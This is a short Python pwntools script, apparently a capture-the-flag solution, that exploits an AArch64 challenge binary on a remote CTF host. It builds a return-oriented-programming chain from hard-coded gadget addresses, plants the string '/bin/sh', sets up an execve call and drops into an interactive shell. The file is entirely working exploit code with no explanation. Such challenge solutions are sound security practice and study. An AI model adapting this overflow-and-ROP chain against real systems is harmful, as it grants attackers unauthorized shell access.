from pwn import *

elf = ELF("./chal_patched")

context.binary = elf

# p = process(["qemu-aarch64", "-g", "1234", "./chal_patched"])
p = remote("tcp.ybn.sg", 19229)
# p = process(["qemu-aarch64", "./chal_patched"])

gadget1 = 0x0000000000427094
gadget2 = 0x0000000000430418
gadget3 = 0x0000000000442990
gadget4 = 0x000000000041112c
binsh = 0x4b0028

payload = flat(
    b'a' * 16,
    0xdeadbeef,
    gadget4,
    b'b' * 0x18,
    gadget2,
    b'a' * 24,
    gadget1,
    b'b' * 16,
    b'/bin/sh\x00',
    binsh,
    cyclic(184, n = 8),
    gadget2,
    b'a' * 56,
    gadget3,
    b'a' * 0x10,
    binsh,
    0,
    b'a' * 8,
    221
)

p.sendline(payload)

p.interactive()
